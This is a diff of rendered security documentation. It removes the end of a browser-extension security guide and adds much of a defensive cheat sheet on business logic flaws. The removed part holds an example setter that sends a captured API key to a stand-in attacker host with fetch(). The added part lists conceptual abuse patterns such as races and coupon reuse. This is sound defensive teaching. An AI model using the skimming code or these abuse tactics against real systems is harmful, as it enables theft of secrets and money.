-<span class="w">        </span><span class="nx">fetch</span><span class="p">(</span><span class="sb">`https://attacker.example?data=</span><span class="si">${</span><span class="nx">str</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
-<span class="w">        </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;apiKey&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">str</span>
-<span class="w">        </span><span class="p">})</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">str</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="p">})</span>
-
-<span class="c1">// Extension&#39;s script to be executed on a web page&#39;s context.</span>
-<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
-<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">apiKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="c1">// the setter for &#39;apiKey&#39; is already polluted,</span>
-<span class="w">    </span><span class="c1">// and the below line triggers malicious code and the data is immediately sent.</span>
-<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">apiController</span><span class="p">.</span><span class="nx">apiKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">apiKey</span><span class="p">;</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">})</span>
-</code></pre></div>
-<h3 id="mitigation-prototype-based-data-skimming">Mitigation: Prototype-based Data Skimming<a class="headerlink" href="#mitigation-prototype-based-data-skimming" title="Permanent link">&para;</a></h3>
-<p>Please don't use the web page's context when sensitive user information is handled just for a moment. If communication with scripts in the web page's context is necessary, use only non-sensitive, essential information. For example, pass just a result of validation instead of the whole secret token. It's the case even if you use <code>window.postMessage</code>, because it can be overwritten also and malicious scripts can add listeners for <code>message</code> event.</p>
-<p>Please note that it's not recommended to try to get native (not-overwritten) prototypes by some tricks. It's sure that there are some hacks to get native prototypes in a context where other scripts are also executed, but bypasses of these measures, i.e. how to force other scripts to use overwritten prototypes, are often invented.</p>
-<p>Also, please don't assume your extension's script can use native prototypes even if it's executed at <code>document_start</code> timing. At least, in the case of Chromium browser extension, it's known that the context of a newly created iframe can be tweaked by a web page's script BEFORE the extension's script starts in the iframe event at <code>document_start</code> (<a href="https://issues.chromium.org/issues/40202434">official bug issue</a>).</p>
-<h2 id="13-insecure-message-passing">13. Insecure Message Passing<a class="headerlink" href="#13-insecure-message-passing" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-insecure-message-passing">Vulnerability: Insecure Message Passing<a class="headerlink" href="#vulnerability-insecure-message-passing" title="Permanent link">&para;</a></h3>
-<p>Browser extensions often rely on message passing (<code>chrome.runtime.sendMessage/onMessage</code>) between low-privilege contexts (Content Scripts, Popup) and the high-privilege Service Worker (Background). If the Service Worker fails to validate the sender's origin or URL, a compromised webpage can send malicious messages, tricking the extension into performing privileged actions (e.g., retrieving sensitive data or API keys).</p>
-<h3 id="example-insecure-message-passing">Example: Insecure Message Passing<a class="headerlink" href="#example-insecure-message-passing" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="c1">// In Service Worker (Background)</span>
-<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onMessage</span><span class="p">.</span><span class="nx">addListener</span><span class="p">((</span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">sendResponse</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
-<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">action</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;fetchSecret&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// No validation of sender</span>
-<span class="w">    </span><span class="c1">// A malicious content script/webpage could trigger this.</span>
-<span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">SECRET_API_URL</span><span class="p">);</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">});</span>
-</code></pre></div>
-<h3 id="mitigation-insecure-message-passing">Mitigation: Insecure Message Passing<a class="headerlink" href="#mitigation-insecure-message-passing" title="Permanent link">&para;</a></h3>
-<p>Treat all incoming messages as untrusted input.
-In Service Workers, always:</p>
+<h2 id="why-business-logic-flaws-are-different">Why Business Logic Flaws Are Different<a class="headerlink" href="#why-business-logic-flaws-are-different" title="Permanent link">&para;</a></h2>
+<p>Most well-known web vulnerabilities (SQL injection, XSS, CSRF, path traversal) have a clear technical signature. A security scanner can fuzz parameters, look for reflected payloads, and produce a reasonable report. Business logic bugs don't work that way.</p>
+<p>Consider an e-commerce checkout. The server accepts a request containing a product ID, quantity, and coupon code. Every input is validated: the product ID exists, the quantity is a positive integer, the coupon code matches a known pattern. No technical rule is broken. But the application recalculates the total from the client-submitted price instead of looking it up server-side, so a user can pay one cent for a television. That's a business logic bug, and no amount of input validation helps, because the input is syntactically perfect.</p>
+<p>The patterns repeat across industries:</p>
 <ul>
-<li>Validate <code>sender.id</code> to ensure the message originates from your own extension.</li>
-<li>Validate <code>sender.url</code> or <code>sender.origin</code> to restrict which extension pages or content scripts may communicate.</li>
-<li>Avoid allowing webpages to indirectly influence privileged logic through content scripts.</li>
-<li>Perform strict validation and allow-listing of <code>request.action</code> and all request parameters.</li>
+<li>A user-facing application assumes the client will respect the order of steps in a multi-step workflow, and exposes the endpoints for each step without checking whether the previous steps were completed.</li>
+<li>A system takes user-controlled data (price, account balance, user role) from the request body and trusts it, because the UI never shows the user how to change it.</li>
+<li>An endpoint performs two operations (check balance, then debit) without a lock, so two concurrent requests both pass the balance check and both debit.</li>
+<li>A feature intended to reward legitimate use (referrals, points, promo credits) has no controls against one user creating many accounts.</li>
 </ul>
-<p>Chrome explicitly states that content scripts are less trustworthy than extension pages and must be treated accordingly. Secure example:</p>
-<div class="highlight"><pre><span></span><code><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onMessage</span><span class="p">.</span><span class="nx">addListener</span><span class="p">((</span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">sendResponse</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
-<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">sender</span><span class="p">.</span><span class="nx">id</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">id</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
-<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">sender</span><span class="p">.</span><span class="nx">url</span><span class="o">?</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;chrome-extension://&#39;</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
-
-<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">action</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;fetchSecret&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">SECRET_API_URL</span><span class="p">);</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">});</span>
-</code></pre></div>
-<h2 id="conclusion">Conclusion<a class="headerlink" href="#conclusion" title="Permanent link">&para;</a></h2>
-<p>By following these security best practices, developers can build safer browser extensions and protect users from privacy and security threats. Always prioritize least privilege, encryption, and secure coding principles when developing extensions.</p>
-<p>🔹 References:
-<a href="https://developer.chrome.com/docs/extensions/mv3/security/">Google Chrome Extension Security Guide</a><br />
-<a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices">Mozilla Firefox Extension Security Best Practices</a></p>
+<p>None of these are subtle once you see them. They're just invisible to tools that don't understand the business process.</p>
+<h2 id="always-re-derive-security-relevant-values-server-side">Always Re-derive Security-relevant Values Server-side<a class="headerlink" href="#always-re-derive-security-relevant-values-server-side" title="Permanent link">&para;</a></h2>
+<p>The single most effective defensive habit is this: if a value in the request influences price, access, ownership, or state, assume the client made it up and recompute it from trusted data.</p>
+<h3 id="prices-and-totals">Prices and Totals<a class="headerlink" href="#prices-and-totals" title="Permanent link">&para;</a></h3>
+<p>Never accept a price, subtotal, tax, or total from the client. Accept product identifiers and quantities only, and compute the rest on the server from your own database. The same applies to discounts: accept a coupon code, validate the code server-side, and apply the discount server-side. Don't accept a "discount amount" field from the request.</p>
+<table>
+<thead>
+<tr>
+<th>Client sends</th>
+<th>Server should</th>
+<th>Server should not</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Product ID and quantity</td>
+<td>Look up the price, compute line total</td>
+<td>Accept a price field and trust it</td>
+</tr>
+<tr>
+<td>Coupon code</td>
+<td>Validate and apply the discount itself</td>
+<td>Accept a "discounted total" field</td>
+</tr>
+<tr>
+<td>Shipping selection</td>
+<td>Compute cost from its own rate table</td>
+<td>Accept a shipping cost field</td>
+</tr>
+<tr>
+<td>Tax-exempt flag</td>
+<td>Determine from account state</td>
+<td>Accept a client-supplied exemption</td>
+</tr>
+</tbody>
+</table>
+<p>This pattern extends beyond commerce. A social app shouldn't accept a "post visibility" value from the client if the value is supposed to be derived from the user's privacy settings. A banking app shouldn't accept a "source account balance" that the client calculated.</p>
+<h3 id="permissions-and-ownership">Permissions and Ownership<a class="headerlink" href="#permissions-and-ownership" title="Permanent link">&para;</a></h3>
+<p>Re-check ownership on every request that acts on a resource. Don't rely on the URL, the referrer, or a flag in the request body. The backend should ask: "Is the authenticated user actually allowed to perform this action on this object, right now?"</p>
+<p>A common mistake is checking ownership once when a resource is loaded and then trusting subsequent requests that reference it. Each request is independent. Each request must be authorized on its own.</p>
+<h3 id="identity-and-role">Identity and Role<a class="headerlink" href="#identity-and-role" title="Permanent link">&para;</a></h3>
+<p>Never accept a user ID, tenant ID, or role from the request body unless the request is explicitly an administrative action by a privileged caller, and even then the value has to be validated against what the caller is allowed to manage. The identity of the acting user always comes from the server-side session or token, never from a field the user can edit.</p>
+<h2 id="enforce-workflows-as-explicit-state-machines">Enforce Workflows as Explicit State Machines<a class="headerlink" href="#enforce-workflows-as-explicit-state-machines" title="Permanent link">&para;</a></h2>
+<p>Multi-step processes (signup flows, checkouts, approvals, KYC verification, password reset) are prime targets because developers often implement them as a sequence of pages that the UI walks the user through. If the UI is the only thing enforcing the sequence, an attacker who sends requests directly to each endpoint can skip steps, repeat steps, or reach terminal steps without the prerequisites.</p>
+<h3 id="model-state-on-the-server">Model State on the Server<a class="headerlink" href="#model-state-on-the-server" title="Permanent link">&para;</a></h3>
+<p>Every multi-step workflow should have an explicit state representation stored on the server, keyed to the user or session. Each transition should be validated against the current state.</p>
+<p>A minimal pattern:</p>
+<ol>
+<li>When the workflow starts, create a record with the initial state (e.g., <code>awaiting_email_verification</code>).</li>
+<li>Each step endpoint checks the current state, performs the action, and updates the state to the next valid value.</li>
+<li>If a request arrives for a step that doesn't match the current state, reject it.</li>
+<li>Terminal actions (submit order, approve, transfer funds) only run if the state is exactly what's required for that action.</li>
+</ol>
+<h3 id="dont-use-hidden-form-fields-as-state">Don't Use Hidden Form Fields as State<a class="headerlink" href="#dont-use-hidden-form-fields-as-state" title="Permanent link">&para;</a></h3>
+<p>A pattern that shows up repeatedly in real applications is storing the "current step" as a hidden field in the form, or in a cookie the client can read. This is not enforcement. The client can set it to whatever value it wants. State lives on the server, in storage the client can't write to.</p>
+<h3 id="reject-replays-of-completed-steps">Reject Replays of Completed Steps<a class="headerlink" href="#reject-replays-of-completed-steps" title="Permanent link">&para;</a></h3>
+<p>Once a step has been completed, later attempts to re-run it should fail. This matters especially for one-time operations like applying a signup bonus, redeeming a coupon, claiming a voucher, or accepting a referral reward. The cleanest pattern is to mark each such operation complete in persistent storage and treat attempts to re-run it as errors.</p>
+<h3 id="expire-partial-states">Expire Partial States<a class="headerlink" href="#expire-partial-states" title="Permanent link">&para;</a></h3>
+<p>Workflows that pause for user input (email verification, bank transfer confirmation, multi-step KYC) should have a deadline. If the user hasn't progressed in some bounded time, invalidate the partial state and require them to start over. Long-lived half-completed workflows accumulate and are a frequent source of exploitable inconsistencies.</p>
+<h2 id="prevent-race-conditions-on-sensitive-operations">Prevent Race Conditions on Sensitive Operations<a class="headerlink" href="#prevent-race-conditions-on-sensitive-operations" title="Permanent link">&para;</a></h2>
+<p>Any operation that reads a value, makes a decision, and then writes a value is a potential race condition. If two requests can run at the same time, they can both read the old value, both decide the same thing, and both write. This is how loyalty points get drained, balances go negative, single-use coupons get redeemed many times, and one-per-account bonuses become many-per-account.</p>
+<h3 id="identify-the-critical-sections">Identify the Critical Sections<a class="headerlink" href="#identify-the-critical-sections" title="Permanent link">&para;</a></h3>
+<p>Ask which operations have the shape "check a condition, then act on it". Typical examples:</p>
+<ul>
+<li>Check balance, then debit.</li>
+<li>Check that a coupon hasn't been used, then record its use.</li>
+<li>Check that a user has fewer than N items, then add one.</li>
+<li>Check that a slot is available, then book it.</li>
+<li>Check that a referral code hasn't been applied to this account, then apply it.</li>
+</ul>
+<p>Each of these is a race condition waiting to happen unless the check and the act are inside a single atomic operation.</p>
+<h3 id="use-database-transactions-and-locks">Use Database Transactions and Locks<a class="headerlink" href="#use-database-transactions-and-locks" title="Permanent link">&para;</a></h3>
+<p>The most broadly available fix is a database transaction with the right isolation level. At the default isolation level of most databases, the check and the update run separately and another transaction can slip between them. For operations that must be atomic, use one of:</p>
+<ul>
+<li>A <code>SERIALIZABLE</code> transaction isolation level. The database will detect conflicts and roll back one of the competing transactions.</li>
+<li>An explicit row lock (<code>SELECT ... FOR UPDATE</code> in PostgreSQL, MySQL InnoDB, and similar). The second caller blocks until the first one commits.</li>
+<li>A conditional update (<code>UPDATE ... WHERE balance &gt;= amount</code>) that succeeds only if the predicate still holds at write time. Check the number of affected rows. If zero, the check failed and the caller should see an error.</li>
+</ul>
+<h3 id="use-idempotency-keys-for-external-actions">Use Idempotency Keys for External Actions<a class="headerlink" href="#use-idempotency-keys-for-external-actions" title="Permanent link">&para;</a></h3>
+<p>For operations that talk to external systems (charge a card, send money, issue a voucher), a retry from the client should not result in a duplicate action. Accept a client-supplied idempotency key, store it with the result, and return the cached result on retry. Stripe and other payment providers implement this pattern, and the same idea applies to any non-idempotent operation your own service exposes.</p>
+<h3 id="dont-assume-fast-enough">Don't Assume "Fast Enough"<a class="headerlink" href="#dont-assume-fast-enough" title="Permanent link">&para;</a></h3>
+<p>A common rationalization is "the window between the check and the update is microseconds, no attacker can exploit it". Concurrent request tools can trivially send dozens of requests to arrive within a millisecond of each other. Modern bug bounty tooling sends them as a single multiplexed HTTP/2 request so they land at the server effectively simultaneously. If the window exists at all, assume it's exploitable.</p>
+<h3 id="pattern-reference">Pattern Reference<a class="headerlink" href="#pattern-reference" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Operation shape</th>
+<th>Safe pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Read-modify-write on a single row</td>
+<td><code>SELECT ... FOR UPDATE</code> then <code>UPDATE</code>, inside a transaction</td>
+</tr>
+<tr>
+<td>Conditional decrement on a counter</td>
+<td><code>UPDATE ... SET value = value - 1 WHERE value &gt; 0</code>, check affected rows</td>
+</tr>
+<tr>
+<td>One-per-user bonus</td>
+<td>Unique constraint on (user_id, bonus_type) and let the database reject duplicates</td>
+</tr>
+<tr>
+<td>External non-idempotent call</td>
+<td>Idempotency key table plus a transactional write of the result</td>
+</tr>
+<tr>
+<td>Cross-row consistency</td>
+<td>Serializable transaction with explicit retry logic</td>
+</tr>
+</tbody>
+</table>
+<h2 id="protect-abuse-friendly-features">Protect Abuse-friendly Features<a class="headerlink" href="#protect-abuse-friendly-features" title="Permanent link">&para;</a></h2>
+<p>Some features are inherently abuse magnets because they dispense value in response to user actions. Referral bonuses, promo codes, signup credits, free trials, email reminders, password reset flows, account recovery paths, and anything that sends messages or makes outbound requests. These need their own controls beyond the authentication controls on the rest of the app.</p>
+<h3 id="abuse-patterns-to-design-against">Abuse Patterns to Design Against<a class="headerlink" href="#abuse-patterns-to-design-against" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Multi-accounting.</strong> One human creates many accounts to claim one-per-account rewards multiple times. Ask whether your signup flow makes this trivially cheap and consider what signals you have to detect it.</li>
+<li><strong>Self-referral.</strong> A user refers themselves using a second account. Referral flows should check that referrer and referee are distinguishable humans, not just distinguishable accounts.</li>
+<li><strong>Coupon stacking.</strong> Multiple promos that were each meant to be used alone get combined to push a price below cost. If your coupon engine allows stacking by default, it's probably a bug.</li>
+<li><strong>Free trial resets.</strong> A user cancels and re-signs up repeatedly to stay on the free tier forever. Track trial eligibility by something more stable than an email address.</li>
+<li><strong>Resource exhaustion.</strong> Features that send email, make outbound HTTP calls, trigger webhooks, or run expensive computations on demand are DoS vectors and spam vectors unless rate-limited.</li>
+<li><strong>Enumeration through behavior.</strong> A password reset endpoint that returns different messages for valid and invalid emails leaks account existence.</li>
+</ul>
+<h3 id="controls-to-apply">Controls to Apply<a class="headerlink" href="#controls-to-apply" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Per-feature rate limits.</strong> A global rate limit at the edge is not enough. The signup-bonus endpoint, the referral endpoint, the promo-redemption endpoint each need their own limits.</li>
+<li><strong>Identity signals beyond email.</strong> Device fingerprints, payment-method fingerprints, phone number verification, and KYC verification all carry more signal than email addresses, which are cheap to create in bulk.</li>
+<li><strong>Audit trails on value-dispensing operations.</strong> Every issued credit, applied promo, or granted bonus should be logged with the triggering user, target user, IP, and timestamp. When abuse is suspected, the log is how you untangle it.</li>
+<li><strong>Maximums at every layer.</strong> A per-action cap (e.g., one bonus per account) plus a per-account cap (e.g., total lifetime promo value) plus a per-source cap (e.g., per payment method or per device) gives defense in depth.</li>
+<li><strong>Asymmetric consequences.</strong> Actions that give value should be harder than actions that don't. Making someone wait 30 seconds, or complete a CAPTCHA, to claim a reward is fine. The legitimate user clicks once and moves on; the automated abuser suffers a per-request cost.</li>
+</ul>
+<h2 id="threat-model-from-the-business-process">Threat Model from the Business Process<a class="headerlink" href="#threat-model-from-the-business-process" title="Permanent link">&para;</a></h2>
+<p>Most threat modeling is done from a technical angle: data flow diagrams, trust boundaries, STRIDE categories. That's useful, but it misses the bugs where the code is technically correct and the process is the problem. Business logic threat modeling asks different questions.</p>
+<h3 id="questions-to-ask-early">Questions to Ask Early<a class="headerlink" href="#questions-to-ask-early" title="Permanent link">&para;</a></h3>
+<ul>
+<li>What does a legitimate user do in this feature, step by step?</li>
+<li>What does the system do at each step, and what assumption is it making about the user's intent?</li>
+<li>Which of those assumptions would benefit the user if they were false? (That's where the bugs live.)</li>
+<li>Can the user do things out of order? Skip a step? Repeat a step?</li>
+<li>Can two users act on the same object at the same time?</li>
+<li>Can one user act from two directions at once (e.g., two tabs, two devices)?</li>
+<li>What does this feature produce that has value? (Credits, access, trust, messages, outbound requests.)</li>
+<li>If an adversary tried to exploit this feature for gain, how would they go about it?</li>
+<li>What invariant must always hold (e.g., "a coupon can only be used once", "an account balance can never be negative")? What enforces it, and is that enforcement atomic?</li>
+</ul>
+<h3 id="the-dishonest-user-exercise">The "Dishonest User" Exercise<a class="headerlink" href="#the-dishonest-user-exercise" title="Permanent link">&para;</a></h3>
+<p>Sit with the feature specification and imagine a user whose only goal is to extract maximum value while staying within the letter of the system's rules. What would they do? What combination of legitimate actions would produce an illegitimate outcome? This is different from thinking about a technical attacker. The dishonest user isn't sending malicious payloads. They're using the app exactly as designed, just in an order or volume the designer didn't anticipate.</p>
+<h3 id="write-down-the-invariants">Write Down the Invariants<a class="headerlink" href="#write-down-the-invariants" title="Permanent link">&para;</a></h3>
+<p>For any feature that handles value, ownership, or state, write down the invariants in plain English:</p>
+<ul>
+<li>A user cannot approve their own request.</li>
+<li>A coupon code is valid for one redemption per user, and never more than N total.</li>
+<li>A transfer cannot complete if it would leave the source account below zero.</li>
+<li>A workflow reaches the "approved" state only after both reviewer A and reviewer B have approved.</li>
+</ul>
+<p>Then for each invariant, identify exactly what code enforces it. If the answer is "the UI" or "the user won't try that", the invariant isn't actually enforced.</p>
+<h2 id="authorization-at-the-business-logic-layer">Authorization at the Business-logic Layer<a class="headerlink" href="#authorization-at-the-business-logic-layer" title="Permanent link">&para;</a></h2>
+<p>Technical authorization (is this user authenticated, do they have this role) is necessary but not sufficient. Many business logic bugs are authorization bugs in disguise: the user has the general permission to use a feature, but the specific action they're taking violates a rule the system didn't think to check.</p>
+<h3 id="contextual-authorization">Contextual Authorization<a class="headerlink" href="#contextual-authorization" title="Permanent link">&para;</a></h3>
+<p>Check not just "can this user do X" but "can this user do X on this object, in this state, right now".</p>
+<p>Examples:</p>
+<ul>
+<li>A manager can approve expense reports, but not their own.</li>
+<li>A reviewer can approve a pull request, but not if they authored it.</li>
+<li>A user can cancel an order, but not after it has shipped.</li>
+<li>A user can change their email, but not to an address already in use, and not without verifying the new address.</li>
+</ul>
+<p>These checks are part of the business logic, not the authentication layer. They typically require knowledge the auth middleware doesn't have. Keep them close to the operation they guard.</p>
+<h3 id="avoid-implicit-permissions">Avoid "Implicit" Permissions<a class="headerlink" href="#avoid-implicit-permissions" title="Permanent link">&para;</a></h3>
+<p>If two features logically grant the same permission, make sure both are guarded. An internal admin endpoint that's checked carefully is no help if the same operation is reachable through a less-guarded public endpoint.</p>
+<p>Map every sensitive operation to every entry point that can trigger it, and verify each entry point enforces the rules. When adding a new entry point (a new API version, an internal tool, a webhook handler), explicitly audit which business rules it needs to apply.</p>
+<h3 id="reference-related-guidance">Reference Related Guidance<a class="headerlink" href="#reference-related-guidance" title="Permanent link">&para;</a></h3>
+<p>For general access control guidance, see the <a href="Access_Control_Cheat_Sheet.html">Access Control Cheat Sheet</a> and the <a href="Authorization_Cheat_Sheet.html">Authorization Cheat Sheet</a>. For the higher-sensitivity case of financial or state-changing transactions, see the <a href="Transaction_Authorization_Cheat_Sheet.html">Transaction Authorization Cheat Sheet</a>.</p>
+<h2 id="validate-inputs-for-business-meaning-not-just-format">Validate Inputs for Business Meaning, Not Just Format<a class="headerlink" href="#validate-inputs-for-business-meaning-not-just-format" title="Permanent link">&para;</a></h2>
+<p>Input validation typically focuses on format: is this a well-formed integer, is this within length limits, does it match a whitelist of characters. That catches injection attacks but not business logic abuse. The input can be perfectly formatted and still semantically invalid.</p>
+<h3 id="validate-ranges">Validate Ranges<a class="headerlink" href="#validate-ranges" title="Permanent link">&para;</a></h3>
+<p>A quantity can be a positive integer and still be wrong. A discount can be numeric and still absurd. Validate against the meaningful range for the business:</p>
+<ul>
+<li>Quantity must be at least 1 and no more than the stock available.</li>
+<li>Date must be in the future, not more than a year out, not on a blocked day.</li>
+<li>Amount must be positive, not more than the account allows, not above a regulatory limit.</li>
+<li>Text length must match what the downstream system can accept, which may be shorter than a generic limit.</li>
+</ul>
+<h3 id="validate-combinations">Validate Combinations<a class="headerlink" href="#validate-combinations" title="Permanent link">&para;</a></h3>
+<p>Fields that are individually valid can be collectively invalid. A booking for a valid room with a valid check-in date and a valid check-out date might still be invalid if the check-out precedes the check-in. A transfer between two valid accounts might still be invalid if the accounts belong to different customers and the user lacks permission to act on both.</p>
+<p>Write the validation rules that describe legal combinations and enforce them server-side. Unit-test the cases where each individual field is valid but the combination is not.</p>
+<h3 id="dont-trust-derived-or-hidden-fields">Don't Trust Derived or Hidden Fields<a class="headerlink" href="#dont-trust-derived-or-hidden-fields" title="Permanent link">&para;</a></h3>
+<p>Fields that are "not editable in the UI" are fully editable at the HTTP layer. Every field in a request is an input, including the ones in hidden form controls, disabled form controls, fields set by JavaScript, and fields you set in a previous response and expect to receive unchanged. If a field matters, validate it as if it came from an attacker, because it did.</p>
+<h2 id="observability-and-anomaly-detection">Observability and Anomaly Detection<a class="headerlink" href="#observability-and-anomaly-detection" title="Permanent link">&para;</a></h2>
+<p>Even a well-designed feature will eventually face a creative abuse attempt. Logging and monitoring are what let you notice it and respond.</p>
+<h3 id="what-to-log">What to Log<a class="headerlink" href="#what-to-log" title="Permanent link">&para;</a></h3>
+<p>For any operation that dispenses value, changes permissions, or moves money:</p>
+<ul>
+<li>The authenticated user</li>
+<li>The target resource</li>
+<li>The action taken</li>
+<li>The outcome</li>
+<li>Enough request context to reconstruct what happened (IP, user agent, correlation ID)</li>
+<li>Enough business context to audit (the price computed, the coupon applied, the new state)</li>
+</ul>
+<p>These logs should be tamper-evident and separate from general application logs.</p>
+<h3 id="what-to-alert-on">What to Alert On<a class="headerlink" href="#what-to-alert-on" title="Permanent link">&para;</a></h3>
+<p>Rates of the following often precede or accompany abuse:</p>
+<ul>
+<li>Signups from the same IP, device fingerprint, or payment instrument</li>
+<li>Repeated failed password-reset requests from the same source</li>
+<li>Unusually high rates of promo redemptions, referral completions, or credit issuances</li>
+<li>Bursts of requests to a single endpoint from a single user</li>
+<li>Workflows that complete in substantially less time than a human would need</li>
+</ul>
+<p>You don't need sophisticated machine learning for this. Simple thresholds on per-user, per-IP, and per-device rates catch most automated abuse.</p>
+<h3 id="close-the-loop">Close the Loop<a class="headerlink" href="#close-the-loop" title="Permanent link">&para;</a></h3>
+<p>When monitoring surfaces a potential abuse, two things should happen: the specific incident gets investigated and resolved, and the control that should have prevented it gets added or tightened. A detection that doesn't lead to a prevention is a detection you'll be making again next month.</p>
+<h2 id="testing-business-logic">Testing Business Logic<a class="headerlink" href="#testing-business-logic" title="Permanent link">&para;</a></h2>
+<p>Automated tests are how business rules stay enforced as the code evolves. Focus test effort on the rules, not the happy path.</p>
+<h3 id="test-the-rules-not-the-implementation">Test the Rules, Not the Implementation<a class="headerlink" href="#test-the-rules-not-the-implementation" title="Permanent link">&para;</a></h3>
+<p>For each invariant you identified during threat modeling, write a test that would fail if the invariant were violated. A test that says "a user cannot approve their own request" should attempt exactly that and assert the request is rejected. These tests document the rules as much as they verify them.</p>
+<h3 id="test-concurrency">Test Concurrency<a class="headerlink" href="#test-concurrency" title="Permanent link">&para;</a></h3>
+<p>If two requests can race, write a test that races them. Most test frameworks have ways to fire concurrent requests and assert the end state is consistent (e.g., balance is never negative, coupon is redeemed exactly once, bonus is granted exactly once across all winners).</p>
+<h3 id="test-ordering">Test Ordering<a class="headerlink" href="#test-ordering" title="Permanent link">&para;</a></h3>
+<p>For multi-step workflows, test attempts to skip, repeat, and reorder steps. The expected outcome for each is a rejection, not progress.</p>
+<h3 id="test-with-an-adversarial-mindset">Test with an Adversarial Mindset<a class="headerlink" href="#test-with-an-adversarial-mindset" title="Permanent link">&para;</a></h3>
+<p>Unit tests written by the developer who wrote the feature tend to cover cases the developer was already thinking about. A useful complement is adversarial testing: take the feature specification and write tests for the ways a motivated user would try to misuse it. Often the bug reproduces on the first attempt, because the feature wasn't designed with that misuse in mind.</p>
+<h2 id="common-examples-of-business-logic-flaws">Common Examples of Business Logic Flaws<a class="headerlink" href="#common-examples-of-business-logic-flaws" title="Permanent link">&para;</a></h2>
+<p>Concrete examples help developers recognize the pattern in their own code. The list below is not exhaustive.</p>
+<h3 id="price-and-quantity">Price and Quantity<a class="headerlink" href="#price-and-quantity" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Negative quantity in a cart to get a refund against another item's cost.</li>
+<li>Client-supplied price that the server trusts.</li>
+<li>Zero-price items that are actually valuable because a "free" flag was intended for a different product.</li>
+<li>Currency switching mid-transaction where the amount is kept but the currency changes (e.g., from USD to a much weaker unit).</li>
+<li>Coupon codes applied multiple times, or applied to products they were not meant for.</li>
+</ul>
+<h3 id="workflow">Workflow<a class="headerlink" href="#workflow" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Skipping identity verification by calling the post-verification endpoint directly.</li>
+<li>Advancing a job application, approval, or KYC workflow past a stage that was supposed to be gated on a reviewer.</li>
+<li>Triggering "checkout complete" without having actually paid.</li>
+<li>Claiming a reward for a task that was never completed.</li>
+</ul>
+<h3 id="concurrency">Concurrency<a class="headerlink" href="#concurrency" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Withdrawing the same balance from two concurrent sessions.</li>
+<li>Redeeming a single-use voucher from two parallel requests.</li>
+<li>Transferring the same item to two recipients at once.</li>
+<li>Concurrently updating a counter so that one update is lost.</li>
+</ul>
+<h3 id="authorization-in-disguise">Authorization-in-disguise<a class="headerlink" href="#authorization-in-disguise" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Approving your own request because the "not the author" check was forgotten.</li>
+<li>Canceling an order after it was supposed to be locked in.</li>
+<li>Modifying a shared resource because the "only the owner can modify" rule was never enforced on a specific endpoint.</li>
+</ul>
+<h3 id="value-dispensing-abuse">Value-dispensing Abuse<a class="headerlink" href="#value-dispensing-abuse" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Claiming a signup bonus multiple times by re-signing up.</li>
+<li>Earning referral rewards by referring yourself.</li>
